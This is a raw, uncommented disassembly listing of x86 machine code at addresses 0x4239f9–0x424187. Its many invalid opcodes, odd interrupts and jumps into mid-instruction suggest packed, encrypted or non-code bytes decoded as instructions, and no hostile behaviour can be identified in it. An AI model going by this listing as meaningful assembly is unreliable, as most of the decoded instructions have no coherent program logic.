  4239f9:	shr    DWORD PTR [ebp-0x3282acd8],cl
  4239ff:	jbe    0x423a66
  423a01:	inc    ebx
  423a02:	jge    0x423a33
  423a04:	add    eax,0x8080853c
  423a09:	int    0x8d
  423a0b:	mov    ch,0xcd
  423a0d:	xchg   esi,eax
  423a0e:	mov    ch,0x3b
  423a10:	or     al,0x3b
  423a12:	cdq    
  423a13:	shr    ebx,cl
  423a15:	xchg   edx,eax
  423a16:	shr    edx,cl
  423a18:	sub    BYTE PTR [ebx+0x13],dl
  423a1b:	inc    ebx
  423a1c:	lea    ebp,[ebp-0x7ab2fad1]
  423a22:	add    BYTE PTR [eax-0x32da7233],0x8d
  423a29:	and    eax,0x192ebd3
  423a2e:	add    ch,BYTE PTR [edi-0x723277f7]
  423a34:	mov    ch,0xcd
  423a36:	lea    esi,[ebp+0x192ebd3]
  423a3c:	add    ch,BYTE PTR [edi-0x327e83f7]
  423a42:	lea    esi,ds:0xd3358dcd
  423a48:	jmp    0x4239dc
  423a4a:	add    DWORD PTR [edx],eax
  423a4c:	scas   eax,DWORD PTR es:[edi]
  423a4d:	or     DWORD PTR [edx+edx*4+0x4],edi
  423a51:	aaa    
  423a52:	sbb    al,0x0
  423a54:	add    BYTE PTR [eax],al
  423a56:	add    BYTE PTR [edi+esi*1],0x24
  423a5a:	add    BYTE PTR [eax],al
  423a5c:	add    BYTE PTR [eax+0x24cfcf],al
  423a62:	add    BYTE PTR [eax],al
  423a64:	jno    0x423a66
  423a66:	(bad)  
  423a67:	cmp    eax,0x1ccfcf
  423a6c:	add    BYTE PTR [eax],al
  423a6e:	add    dh,dl
  423a70:	lods   eax,DWORD PTR ds:[esi]
  423a71:	jno    0x423a40
  423a73:	lea    ecx,ds:0xcd4c9100
  423a79:	lea    esi,[ebp+0x4]
  423a7c:	shl    DWORD PTR [eax],cl
  423a7e:	jno    0x423af0
  423a80:	mov    ebp,0xefef
  423a85:	or     dh,BYTE PTR [esi-0x30]
  423a88:	int    0x76
  423a8a:	mov    ch,cl
  423a8c:	lea    ebp,ds:0xcd2d96cd
  423a92:	add    DWORD PTR [ecx],edx
  423a94:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423a9e:	shr    edx,cl
  423aa0:	sub    BYTE PTR [ebx+0x13],dl
  423aa3:	jno    0x423a72
  423aa5:	lea    esi,[ebp+0x3bb596cd]
  423aab:	or     al,0x3b
  423aad:	cdq    
  423aae:	shr    ebx,cl
  423ab0:	xchg   edx,eax
  423ab1:	shr    edx,cl
  423ab3:	sub    BYTE PTR [ebx+0x13],dl
  423ab6:	jno    0x423ab8
  423ab8:	(bad)  
  423ab9:	add    BYTE PTR gs:[eax+0x1c],dh
  423abd:	int    0x76
  423abf:	rcl    bl,1
  423ac1:	ins    DWORD PTR es:[edi],dx
  423ac2:	xchg   edx,eax
  423ac3:	cmp    ecx,ecx
  423ac5:	inc    ebx
  423ac6:	leave  
  423ac7:	int    0x76
  423ac9:	mov    ch,cl
  423acb:	lea    ebp,ds:0x811101cd
  423ad1:	add    BYTE PTR [eax-0x29d26933],0x54
  423ad8:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423adb:	cdq    
  423adc:	shr    ebx,cl
  423ade:	xchg   edx,eax
  423adf:	shr    edx,cl
  423ae1:	sub    BYTE PTR [ebx+0x13],dl
  423ae4:	jno    0x423ab3
  423ae6:	lea    esi,[ebp+0x3bb596cd]
  423aec:	or     al,0x3b
  423aee:	cdq    
  423aef:	shr    ebx,cl
  423af1:	xchg   edx,eax
  423af2:	shr    edx,cl
  423af4:	sub    BYTE PTR [ebx+0x13],dl
  423af7:	jno    0x423af9
  423af9:	(bad)  
  423afa:	jne    0x423afc
  423afc:	jo     0x423b1a
  423afe:	int    0x76
  423b00:	lods   eax,DWORD PTR ds:[esi]
  423b01:	or     dh,BYTE PTR [esi+0x75]
  423b04:	int    0x76
  423b06:	cmp    eax,0xecfd760a
  423b0b:	cmp    BYTE PTR [ebx],bh
  423b0d:	or     al,0x3b
  423b0f:	cdq    
  423b10:	shr    ebx,cl
  423b12:	xchg   edx,eax
  423b13:	shr    edx,cl
  423b15:	sub    BYTE PTR [ebx+0x13],dl
  423b18:	jno    0x423ae7
  423b1a:	lea    esi,[ebp+0x3bb596cd]
  423b20:	or     al,0x3b
  423b22:	cdq    
  423b23:	shr    ebx,cl
  423b25:	xchg   edx,eax
  423b26:	shr    edx,cl
  423b28:	sub    BYTE PTR [ebx+0x13],dl
  423b2b:	jno    0x423b2d
  423b2d:	(bad)  
  423b2e:	lods   eax,DWORD PTR ds:[esi]
  423b2f:	add    BYTE PTR [eax+0x1c],dh
  423b32:	int    0x76
  423b34:	std    
  423b35:	or     dh,BYTE PTR [esi+0x1d]
  423b38:	int    0x76
  423b3a:	jne    0x423b46
  423b3c:	out    0x55,al
  423b3e:	or     dh,BYTE PTR [esi-0x30]
  423b41:	leave  
  423b42:	jbe    0x423ae1
  423b44:	inc    ecx
  423b45:	and    DWORD PTR [esi+0x5576cd35],eax
  423b4b:	int    0x8d
  423b4d:	push   ebp
  423b4e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423b51:	or     al,0xd3
  423b53:	lods   eax,DWORD PTR ds:[esi]
  423b54:	sub    bl,dl
  423b56:	jmp    0x423aea
  423b58:	push   ebx
  423b59:	ror    DWORD PTR [edx],cl
  423b5b:	jbe    0x423ba2
  423b5d:	int    0x76
  423b5f:	push   ebp
  423b60:	int    0x8d
  423b62:	push   ebp
  423b63:	cmp    edi,DWORD PTR [ecx+0x3b]
  423b66:	or     al,0xd3
  423b68:	lods   eax,DWORD PTR ds:[esi]
  423b69:	sub    bl,dl
  423b6b:	jmp    0x423aff
  423b6d:	push   ebx
  423b6e:	ror    DWORD PTR [edx],cl
  423b70:	jbe    0x423b7f
  423b72:	leave  
  423b73:	jbe    0x423b0a
  423b75:	dec    eax
  423b76:	and    DWORD PTR [esi-0x528936cb],eax
  423b7c:	ret    0x8621
  423b7f:	xor    eax,0xcd5576cd
  423b84:	lea    edx,[ebp+0x3b]
  423b87:	jns    0x423bc4
  423b89:	or     al,0xd3
  423b8b:	jmp    0x423b1f
  423b8d:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423b93:	lea    ebx,ds:0x52f7d43
  423b99:	push   ss
  423b9a:	xchg   DWORD PTR [eax-0x6d241480],eax
  423ba0:	add    BYTE PTR [eax-0x326a7233],0x76
  423ba7:	xchg   ebp,eax
  423ba8:	int    0x96
  423baa:	inc    ebp
  423bab:	cmp    eax,ebp
  423bad:	cmp    ecx,DWORD PTR [edi]
  423baf:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423bb5:	push   ebx
  423bb6:	jge    0x423b85
  423bb8:	jbe    0x423bd7
  423bba:	xor    edx,edx
  423bbc:	cmp    ebx,edx
  423bbe:	clc    
  423bbf:	add    cl,BYTE PTR [edx]
  423bc1:	jbe    0x423bd0
  423bc3:	int    0x76
  423bc5:	lods   eax,DWORD PTR ds:[esi]
  423bc6:	int    0x8d
  423bc8:	lods   eax,DWORD PTR ds:[esi]
  423bc9:	cmp    edi,DWORD PTR [ecx+0x3b]
  423bcc:	or     al,0xd3
  423bce:	jmp    0x423b62
  423bd0:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423bd6:	lea    ecx,ds:0x16d87d43
  423bdc:	int    0x76
  423bde:	lods   eax,DWORD PTR ds:[esi]
  423bdf:	int    0x8d
  423be1:	lods   eax,DWORD PTR ds:[esi]
  423be2:	cmp    edi,DWORD PTR [ecx+0x3b]
  423be5:	or     al,0xd3
  423be7:	lods   eax,DWORD PTR ds:[esi]
  423be8:	sub    bl,dl
  423bea:	jmp    0x423b7e
  423bec:	push   ebx
  423bed:	ror    DWORD PTR [edx],cl
  423bef:	jbe    0x423bfe
  423bf1:	int    0x76
  423bf3:	xchg   ebp,eax
  423bf4:	int    0x8d
  423bf6:	xchg   ebp,eax
  423bf7:	cmp    edi,DWORD PTR [ecx+0x3b]
  423bfa:	or     al,0xd3
  423bfc:	lods   eax,DWORD PTR ds:[esi]
  423bfd:	sub    bl,dl
  423bff:	jmp    0x423b93
  423c01:	push   ebx
  423c02:	ror    ebp,cl
  423c04:	lea    ecx,ds:0xad3d12f
  423c0a:	jbe    0x423c19
  423c0c:	int    0x76
  423c0e:	push   ebp
  423c0f:	int    0x8d
  423c11:	push   ebp
  423c12:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c15:	or     al,0xd3
  423c17:	jmp    0x423bab
  423c19:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c1f:	lea    ecx,ds:0x52f7d43
  423c25:	pusha  
  423c26:	xchg   edx,eax
  423c27:	add    BYTE PTR [eax+0xa0d76cd],0x76
  423c2e:	or     eax,0x874576cd
  423c33:	jbe    0x423c05
  423c35:	or     ah,dh
  423c37:	cmp    eax,0x5d5d760a
  423c3c:	inc    ecx
  423c3d:	and    DWORD PTR [esi+0x6d760a35],eax
  423c43:	leave  
  423c44:	jbe    0x423cab
  423c46:	cmp    DWORD PTR [ecx],esp
  423c48:	xchg   BYTE PTR ds:0xb22576c9,dh
  423c4e:	and    DWORD PTR [esi-0xe89f5cb],eax
  423c54:	int    0x76
  423c56:	cmp    eax,0x3b3d8dcd
  423c5b:	jns    0x423c98
  423c5d:	or     al,0xd3
  423c5f:	lods   eax,DWORD PTR ds:[esi]
  423c60:	sub    bl,dl
  423c62:	jmp    0x423bf6
  423c64:	push   ebx
  423c65:	ror    DWORD PTR [edx],cl
  423c67:	jbe    0x423ce6
  423c69:	int    0x6d
  423c6b:	jmp    0x423c73
  423c6d:	add    DWORD PTR [eax-0x36923280],0x8c06
  423c77:	add    BYTE PTR [ebx],cl
  423c79:	and    DWORD PTR [esi-0x369232cb],eax
  423c7f:	push   es
  423c80:	jl     0x423c82
  423c82:	add    BYTE PTR [eax],al
  423c84:	mul    DWORD PTR [ecx]
  423c86:	xchg   BYTE PTR ds:0x6dcd6dcd,dh
  423c8c:	int    0x76
  423c8e:	icebp  
  423c8f:	int    0x8d
  423c91:	icebp  
  423c92:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c95:	or     al,0xd3
  423c97:	lods   eax,DWORD PTR ds:[esi]
  423c98:	sub    bl,dl
  423c9a:	jmp    0x423c2e
  423c9c:	push   ebx
  423c9d:	ror    ebp,cl
  423c9f:	lea    edi,[ebp+0x2f]
  423ca2:	rcl    ebx,1
  423ca4:	int    0x8d
  423ca6:	pop    ebp
  423ca7:	retf   0x8884
  423caa:	or     DWORD PTR [esi-0x1f],esi
  423cad:	int    0x6d
  423caf:	int    0x76
  423cb1:	icebp  
  423cb2:	int    0x8d
  423cb4:	icebp  
  423cb5:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423cb8:	jns    0x423c8d
  423cba:	jmp    0x423c4e
  423cbc:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423cc2:	lea    edi,[ebp+0x2f]
  423cc5:	rcl    ebx,1
  423cc7:	int    0x8d
  423cc9:	gs int 0x96
  423ccc:	cmp    ecx,DWORD PTR gs:[edi]
  423ccf:	cmp    edx,ebp
  423cd1:	shl    edx,cl
  423cd3:	sub    bl,dl
  423cd5:	repz xchg edx,eax
  423cd7:	push   ebx
  423cd8:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423cde:	das    
  423cdf:	pop    ecx
  423ce0:	dec    esp
  423ce1:	mov    ch,cl
  423ce3:	push   es
  423ce4:	mov    WORD PTR [eax],es
  423ce6:	add    BYTE PTR [eax],al
  423ce8:	int    0x17
  423cea:	mov    WORD PTR [eax],es
  423cec:	add    BYTE PTR [eax],al
  423cee:	cmp    edi,DWORD PTR [ecx+0x3b]
  423cf1:	aad    0xd3
  423cf3:	lods   eax,DWORD PTR ds:[esi]
  423cf4:	sub    bl,dl
  423cf6:	repz xchg edx,eax
  423cf8:	push   ebx
  423cf9:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423cff:	loope  0x423d3c
  423d01:	jge    0x423d0c
  423d03:	(bad)  
  423d04:	loope  0x423cd3
  423d06:	ins    DWORD PTR es:[edi],dx
  423d07:	retf   0xe176
  423d0a:	int    0x8d
  423d0c:	icebp  
  423d0d:	int    0x96
  423d0f:	icebp  
  423d10:	cmp    ecx,DWORD PTR [edi]
  423d12:	cmp    edx,ebp
  423d14:	shl    ebx,cl
  423d16:	xchg   edx,eax
  423d17:	shl    edx,cl
  423d19:	sub    BYTE PTR [ebx+0x13],dl
  423d1c:	int    0x96
  423d1e:	jge    0x423d4f
  423d20:	rcl    DWORD PTR [ebx],1
  423d22:	int    0x96
  423d24:	pop    ebp
  423d25:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423d2c:	icebp  
  423d2d:	int    0x8d
  423d2f:	icebp  
  423d30:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d33:	or     al,0xd3
  423d35:	lods   eax,DWORD PTR ds:[esi]
  423d36:	sub    bl,dl
  423d38:	jmp    0x423ccc
  423d3a:	push   ebx
  423d3b:	ror    ebp,cl
  423d3d:	lea    edi,[ebp+0x2f]
  423d40:	rcl    ebx,1
  423d42:	int    0x8d
  423d44:	pop    ebp
  423d45:	retf   0x8884
  423d48:	or     DWORD PTR [esi-0x1f],esi
  423d4b:	int    0x6d
  423d4d:	int    0x76
  423d4f:	icebp  
  423d50:	int    0x8d
  423d52:	icebp  
  423d53:	cmp    edi,DWORD PTR [ecx-0x2d]
  423d56:	lods   eax,DWORD PTR ds:[esi]
  423d57:	sub    BYTE PTR [ebx],bh
  423d59:	or     al,0xd3
  423d5b:	jmp    0x423cef
  423d5d:	push   ebx
  423d5e:	ror    ebp,cl
  423d60:	lea    edi,[ebp+0x2f]
  423d63:	rcl    ebx,1
  423d65:	int    0x8d
  423d67:	ins    DWORD PTR es:[edi],dx
  423d68:	int    0x96
  423d6a:	ins    DWORD PTR es:[edi],dx
  423d6b:	cmp    ecx,DWORD PTR [edi]
  423d6d:	cmp    edx,ebp
  423d6f:	shl    edx,cl
  423d71:	sub    bl,dl
  423d73:	repz xchg edx,eax
  423d75:	push   ebx
  423d76:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423d7c:	das    
  423d7d:	pop    ecx
  423d7e:	dec    esp
  423d7f:	mov    ch,cl
  423d81:	push   es
  423d82:	jl     0x423d84
  423d84:	add    BYTE PTR [eax],al
  423d86:	int    0x17
  423d88:	jl     0x423d8a
  423d8a:	add    BYTE PTR [eax],al
  423d8c:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d8f:	aad    0xd3
  423d91:	lods   eax,DWORD PTR ds:[esi]
  423d92:	sub    bl,dl
  423d94:	repz xchg edx,eax
  423d96:	push   ebx
  423d97:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423d9d:	loope  0x423dda
  423d9f:	jge    0x423daa
  423da1:	(bad)  
  423da2:	loope  0x423d71
  423da4:	ins    DWORD PTR es:[edi],dx
  423da5:	retf   0xe176
  423da8:	int    0x8d
  423daa:	icebp  
  423dab:	int    0x96
  423dad:	icebp  
  423dae:	cmp    ecx,DWORD PTR [edi]
  423db0:	cmp    edx,ebp
  423db2:	shl    ebx,cl
  423db4:	xchg   edx,eax
  423db5:	shl    edx,cl
  423db7:	sub    BYTE PTR [ebx+0x13],dl
  423dba:	int    0x96
  423dbc:	jge    0x423ded
  423dbe:	rcl    DWORD PTR [ebx],1
  423dc0:	int    0x96
  423dc2:	pop    ebp
  423dc3:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423dca:	and    eax,0x3b258dcd
  423dcf:	or     al,0x3b
  423dd1:	jns    0x423da6
  423dd3:	jmp    0x423d67
  423dd5:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423ddb:	lea    ebp,[ebp-0x33]
  423dde:	xchg   esi,eax
  423ddf:	ins    DWORD PTR es:[edi],dx
  423de0:	cmp    ecx,DWORD PTR [edi]
  423de2:	cmp    edx,ebp
  423de4:	shl    edx,cl
  423de6:	sub    bl,dl
  423de8:	repz xchg edx,eax
  423dea:	push   ebx
  423deb:	adc    ebp,DWORD PTR [edi]
  423ded:	rcl    ebx,1
  423def:	xchg   DWORD PTR [esi+0x7d],esi
  423df2:	or     dh,BYTE PTR [esi+0x7d]
  423df5:	int    0x76
  423df7:	jge    0x423dc6
  423df9:	lea    ecx,ds:0xb2f7d43
  423dff:	(bad)  
  423e00:	inc    DWORD PTR [eax]
  423e02:	add    ch,cl
  423e04:	jbe    0x423e73
  423e06:	int    0x8d
  423e08:	ins    DWORD PTR es:[edi],dx
  423e09:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e0c:	jmp    0x423da0
  423e0e:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e11:	lods   eax,DWORD PTR ds:[esi]
  423e12:	sub    BYTE PTR [ebx-0x2d],dl
  423e15:	int    0x8d
  423e17:	or     eax,0xcdd3d12f
  423e1c:	lea    edi,ds:0xf2d30f3b
  423e22:	sub    BYTE PTR [ebx-0x2d],dl
  423e25:	int    0x8d
  423e27:	cmp    eax,0xebd30c3b
  423e2c:	xchg   edx,eax
  423e2d:	push   ebx
  423e2e:	ror    DWORD PTR [edx],cl
  423e30:	jbe    0x423e97
  423e32:	int    0x76
  423e34:	popf   
  423e35:	int    0x8d
  423e37:	popf   
  423e38:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423e3b:	jmp    0x423dcf
  423e3d:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e40:	lods   eax,DWORD PTR ds:[esi]
  423e41:	sub    BYTE PTR [ebx-0x2d],dl
  423e44:	int    0x8d
  423e46:	popf   
  423e47:	int    0x96
  423e49:	popf   
  423e4a:	cmp    ecx,DWORD PTR [edi]
  423e4c:	shl    edx,cl
  423e4e:	sub    BYTE PTR [ebx],bh
  423e50:	aad    0xd3
  423e52:	repz xchg edx,eax
  423e54:	push   ebx
  423e55:	adc    eax,DWORD PTR [edi+0x7d87658d]
  423e5b:	xchg   DWORD PTR [ebp+0x458d0a45],ecx
  423e61:	in     al,dx
  423e62:	sbb    al,0xcd
  423e64:	jbe    0x423e03
  423e66:	int    0x8d
  423e68:	popf   
  423e69:	cmp    edi,DWORD PTR [ecx+0x3b]
  423e6c:	or     al,0xd3
  423e6e:	lods   eax,DWORD PTR ds:[esi]
  423e6f:	sub    bl,dl
  423e71:	jmp    0x423e05
  423e73:	push   ebx
  423e74:	rol    DWORD PTR [edi+0x760a4576],cl
  423e7a:	inc    ebp
  423e7b:	int    0x76
  423e7d:	popf   
  423e7e:	int    0x8d
  423e80:	popf   
  423e81:	cmp    edi,DWORD PTR [ecx-0x2d]
  423e84:	lods   eax,DWORD PTR ds:[esi]
  423e85:	sub    BYTE PTR [ebx],bh
  423e87:	or     al,0xd3
  423e89:	jmp    0x423e1d
  423e8b:	push   ebx
  423e8c:	ror    ebp,cl
  423e8e:	lea    ebx,ds:0x76cd7d33
  423e94:	popf   
  423e95:	int    0x96
  423e97:	popf   
  423e98:	cmp    edi,DWORD PTR [ecx+0x3b]
  423e9b:	aad    0xd3
  423e9d:	repz xchg edx,eax
  423e9f:	shr    DWORD PTR [ebp-0x322dacd8],cl
  423ea5:	xchg   esi,eax
  423ea6:	inc    ebp
  423ea7:	das    
  423ea8:	rcl    edx,1
  423eaa:	inc    ebx
  423eab:	shr    DWORD PTR [edi],cl
  423ead:	pop    es
  423eae:	adc    ebp,edi
  423eb0:	add    BYTE PTR [eax],al
  423eb2:	int    0x76
  423eb4:	mov    BYTE PTR [eax],al
  423eb6:	(bad)  
  423eb7:	dec    esp
  423eb8:	iret   
  423eb9:	jbe    0x423e78
  423ebb:	add    dh,dl
  423ebd:	mov    BYTE PTR [eax-0x33],dh
  423ec0:	jbe    0x423e4a
  423ec2:	int    0x1
  423ec4:	xchg   ebp,eax
  423ec5:	add    DWORD PTR [eax-0x32afff80],0x1cd8876
  423ecf:	icebp  
  423ed0:	add    DWORD PTR [eax+0x500080],0xd600fdd6
  423eda:	jne    0x423e99
  423edc:	test   al,0x88
  423ede:	add    BYTE PTR [eax-0x322f89f6],0x76
  423ee5:	stc    
  423ee6:	int    0x8d
  423ee8:	stc    
  423ee9:	cmp    eax,ebp
  423eeb:	cmp    ecx,DWORD PTR [edi]
  423eed:	shl    edx,cl
  423eef:	sub    bl,dl
  423ef1:	mov    ebp,0xcdd35392
  423ef6:	lea    esi,[ebp+0x43]
  423ef9:	rcl    esp,cl
  423efb:	push   esi
  423efc:	int    0x76
  423efe:	mov    ch,cl
  423f00:	lea    ebp,ds:0xcd2d96cd
  423f06:	add    DWORD PTR [ecx],edx
  423f08:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423f12:	shr    edx,cl
  423f14:	sub    BYTE PTR [ebx+0x13],dl
  423f17:	jno    0x423ee6
  423f19:	(bad)  
  423f1a:	stc    
  423f1b:	int    0x96
  423f1d:	stc    
  423f1e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423f21:	cdq    
  423f22:	shr    ebx,cl
  423f24:	xchg   edx,eax
  423f25:	shr    edx,cl
  423f27:	sub    BYTE PTR [ebx+0x13],dl
  423f2a:	jno    0x423f2c
  423f2c:	(bad)  
  423f2d:	jne    0x423f2f
  423f2f:	jo     0x423f4d
  423f31:	stos   BYTE PTR es:[edi],al
  423f32:	test   al,0x63
  423f34:	retf   
  423f35:	ror    BYTE PTR [eax-0x12326980],cl
  423f3b:	add    al,0xed
  423f3d:	and    al,0x98
  423f3f:	int    0x11
  423f41:	int    0x12
  423f43:	sub    eax,0x4808081
  423f48:	pop    esp
  423f49:	sub    BYTE PTR [edi],0x5
  423f4c:	dec    edx
  423f4d:	add    DWORD PTR [eax+0x2fda0680],0x80819205
  423f57:	add    BYTE PTR [esi],0xf7
  423f5a:	das    
  423f5b:	add    eax,0x80808003
  423f60:	int    0x7
  423f62:	or     DWORD PTR [eax+0x6d068080],eax
  423f68:	das    
  423f69:	add    eax,0x808080e9
  423f6e:	add    al,0x69
  423f70:	int3   
  423f71:	add    BYTE PTR [eax+0x52f3080],0xe2
  423f78:	add    BYTE PTR [eax+0x54985e80],0x2f
  423f7f:	add    eax,0x808080e3
  423f84:	int    0xc1
  423f86:	and    eax,0x4808081
  423f8b:	mov    dh,0x11
  423f8d:	or     ch,0x13
  423f90:	xor    ecx,DWORD PTR [esi-0x79]
  423f93:	shr    BYTE PTR [edi],cl
  423f95:	mov    ebx,0x8d0a4c70
  423f9a:	mov    ch,0x2f
  423f9c:	mov    ebx,0x13874e7c
  423fa1:	das    
  423fa2:	add    eax,0x80808049
  423fa7:	iret   
  423fa8:	jl     0x423fbe
  423faa:	pop    ebx
  423fab:	or     cl,BYTE PTR [ebp+0x69bd]
  423fb1:	add    BYTE PTR [ebx-0x2baef966],al
  423fb7:	or     ebp,0x31
  423fba:	add    al,0xb6
  423fbc:	cmc    
  423fbd:	sub    BYTE PTR [ebx],0x99
  423fc0:	xchg   ecx,esi
  423fc2:	das    
  423fc3:	mov    ebx,0xbb2f4ee0
  423fc8:	mov    al,ds:0xd4fc874c
  423fcd:	mov    esi,0xa148acf
  423fd2:	(bad)  
  423fd3:	in     eax,dx
  423fd4:	push   es
  423fd5:	push   ecx
  423fd6:	aam    0x6e
  423fd8:	int    0x89
  423fda:	add    al,0xb6
  423fdc:	stc    
  423fdd:	sub    BYTE PTR [ebx],0xf
  423fe0:	xchg   DWORD PTR [ebp+0x2f],edi
  423fe3:	mov    ebx,0xbb2f4ede
  423fe8:	sahf   
  423fe9:	dec    esp
  423fea:	xchg   esp,edi
  423fec:	aam    0x33
  423fee:	iret   
  423fef:	ficom  WORD PTR [edx+ecx*1]
  423ff2:	out    0xfd,al
  423ff4:	int    0xe6
  423ff6:	std    
  423ff7:	int    0x6a
  423ff9:	push   es
  423ffa:	add    ah,dl
  423ffc:	xchg   ch,cl
  423ffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fff:	mov    ch,0x81
  424001:	and    al,0x8b
  424003:	das    
  424004:	mov    ebx,0xbb2f4ede
  424009:	sahf   
  42400a:	dec    esp
  42400b:	add    BYTE PTR [esi-0x7],dh
  42400e:	add    al,0x76
  424010:	std    
  424011:	mov    BYTE PTR [edi-0x619a104],al
  424017:	sbb    ch,0x2f
  42401a:	mov    ebx,0xbb2f4ee0
  42401f:	mov    al,ds:0xed8dcd4c
  424024:	add    BYTE PTR [esi-0xb],dh
  424027:	add    al,0xd3
  424029:	mov    BYTE PTR [edi-0x1272f504],al
  42402f:	pop    esi
  424030:	out    0xf5,al
  424032:	sub    BYTE PTR ds:0x2fbd8dcd,0xbb
  424039:	jo     0x424089
  42403b:	das    
  42403c:	mov    ebx,0x76004cdc
  424041:	adc    DWORD PTR [ebx+edx*8],eax
  424044:	mov    BYTE PTR [edi-0x4272f527],al
  42404a:	pop    esi
  42404b:	xchg   esi,eax
  42404c:	adc    DWORD PTR [edi],ebp
  42404e:	or     ebp,DWORD PTR [esi-0x56000000]
  424054:	arpl   WORD PTR [ebx],di
  424056:	ins    DWORD PTR es:[edi],dx
  424057:	ins    BYTE PTR es:[edi],dx
  424058:	in     al,dx
  424059:	xchg   edx,eax
  42405a:	cmp    ebp,DWORD PTR [ebp-0x58]
  42405d:	retf   
  42405e:	lds    edx,FWORD PTR [esi+0xacdedcd]
  424064:	sub    eax,0xcd808081
  424069:	jbe    0x4240b7
  42406b:	add    al,0xed
  42406d:	xor    BYTE PTR [ebx+0x3b],bl
  424070:	fstp   QWORD PTR [eax+0x2f1e5e9a]
  424076:	add    eax,0x8080800b
  42407b:	inc    ebx
  42407c:	(bad)
  42407f:	pop    esi
  424080:	pushf  
  424081:	(bad)  
  424083:	test   DWORD PTR [ebx],edi
  424085:	ins    DWORD PTR es:[edi],dx
  424086:	ins    BYTE PTR es:[edi],dx
  424087:	in     al,dx
  424088:	fmul   st,st(5)
  42408a:	ins    BYTE PTR es:[edi],dx
  42408b:	fadd   QWORD PTR [edi+0x7ccd8876]
  424091:	and    al,0xcd
  424093:	jo     0x4240c9
  424095:	int    0x90
  424097:	adc    al,0xcd
  424099:	fcomp  QWORD PTR [edi+eax*4]
  42409c:	lea    ecx,[eax+0xa889687]
  4240a2:	(bad)  
  4240a3:	std    
  4240a4:	inc    ebx
  4240a5:	clc    
  4240a6:	jnp    0x42402f
  4240a8:	or     ah,dh
  4240aa:	std    
  4240ab:	or     ah,BYTE PTR [esi-0x259a107]
  4240b1:	fsub   st,st(3)
  4240b3:	inc    ebx
  4240b4:	pushf  
  4240b5:	adc    al,0x77
  4240b7:	xchg   BYTE PTR [edi],ch
  4240b9:	mov    ebx,0x92eca054
  4240be:	int    0xf4
  4240c0:	iret   
  4240c1:	push   esp
  4240c2:	ror    ebp,0x68
  4240c5:	push   es
  4240c6:	add    ah,dl
  4240c8:	ds xchg esi,esp
  4240cb:	mov    BYTE PTR [edx],cl
  4240cd:	out    0x11,al
  4240cf:	inc    ebx
  4240d0:	stc    
  4240d1:	fdiv   DWORD PTR [eax]
  4240d3:	int    0xa6
  4240d5:	dec    esp
  4240d6:	int    0x63
  4240d8:	in     al,0x87
  4240da:	popf   
  4240db:	inc    ebx
  4240dc:	cld    
  4240dd:	ja     0x424063
  4240df:	int    0x58
  4240e1:	in     al,dx
  4240e2:	mov    BYTE PTR [ebx],dh
  4240e4:	out    0x88,al
  4240e6:	or     ch,BYTE PTR [eax-0x33]
  4240e9:	(bad)  
  4240ea:	adc    DWORD PTR [esi],eax
  4240ec:	not    esp
  4240ee:	dec    esi
  4240ef:	int    0xa6
  4240f1:	stc    
  4240f2:	dec    ebx
  4240f3:	or     ah,BYTE PTR [esi-0x259bc07]
  4240f9:	sbb    BYTE PTR [ebp-0x14],0x8
  4240fd:	cmp    ebp,DWORD PTR [ebp-0x56]
  424100:	test   al,0x63
  424102:	retf   
  424103:	ror    BYTE PTR [eax-0x12326980],cl
  424109:	add    al,0xed
  42410b:	push   eax
  42410c:	pop    ebx
  42410d:	cwde   
  42410e:	pop    ebp
  42410f:	dec    ecx
  424110:	and    DWORD PTR [esi-0x289f5cb],eax
  424116:	leave  
  424117:	jbe    0x424112
  424119:	inc    ecx
  42411a:	and    DWORD PTR [esi-0x27232cb],eax
  424120:	int    0xa6
  424122:	std    
  424123:	call   0x3b81:0x90cfffc0
  42412a:	psrlq  mm5,mm3
  42412d:	xchg   edx,eax
  42412e:	stos   BYTE PTR es:[edi],al
  42412f:	cmp    esp,ecx
  424131:	shl    ebp,cl
  424133:	sub    BYTE PTR [ebx+0xc],dl
  424136:	or     cl,BYTE PTR [ebp-0x2723243]
  42413c:	int    0x8d
  42413e:	std    
  42413f:	int    0x8d
  424141:	std    
  424142:	int    0x8d
  424144:	std    
  424145:	int    0x8d
  424147:	std    
  424148:	int    0x8d
  42414a:	std    
  42414b:	int    0x8d
  42414d:	std    
  42414e:	int    0x8d
  424150:	std    
  424151:	int    0x8d
  424153:	std    
  424154:	int    0x8d
  424156:	std    
  424157:	leave  
  424158:	jbe    0x42416b
  42415a:	fadd   st,st(5)
  42415c:	loope  0x4241b3
  42415e:	int    0x8d
  424160:	std    
  424161:	int    0xa6
  424163:	std    
  424164:	cmp    esp,ecx
  424166:	cmp    ecx,DWORD PTR [edi]
  424168:	shl    ebp,cl
  42416a:	sub    bl,dl
  42416c:	jmp    0x424100
  42416e:	push   ebx
  42416f:	or     al,0xcd
  424171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424172:	dec    esp
  424173:	int    0x9f
  424175:	sub    eax,0x43808081
  42417a:	push   ebx
  42417b:	das    
  42417c:	add    eax,0x80808717
  424181:	int    0x8d
  424183:	std    
  424184:	int    0xa6
  424186:	std    
  424187:	cmp    ecx,DWORD PTR [edi]
